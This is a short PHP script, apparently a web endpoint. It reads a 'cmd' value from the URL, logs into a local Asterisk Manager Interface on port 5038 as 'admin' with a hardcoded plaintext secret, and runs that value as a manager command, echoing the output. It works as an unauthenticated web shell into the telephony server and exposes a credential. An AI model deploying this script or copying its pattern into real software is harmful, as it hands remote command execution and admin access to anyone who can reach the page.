<?php
$command=$_GET["cmd"];
$socket = fsockopen("127.0.0.1","5038", $errno, $errstr, 10);
      if (!$socket){
        echo "$errstr ($errno)\n";
        }else{ 
            fputs($socket, "Action: Login\r\n");
            fputs($socket, "UserName: admin\r\n");
            fputs($socket, "Secret: HnGz/HvBPY9b\r\n\r\n");
            fputs($socket, "Action: Command\r\n");
            fputs($socket, "Command: $command\r\n\r\n");
           fputs($socket, "Action: Logoff\r\n\r\n");
           while (!feof($socket)){
               echo fgets($socket).'<br>';
            }
            fclose($socket);
            }
?>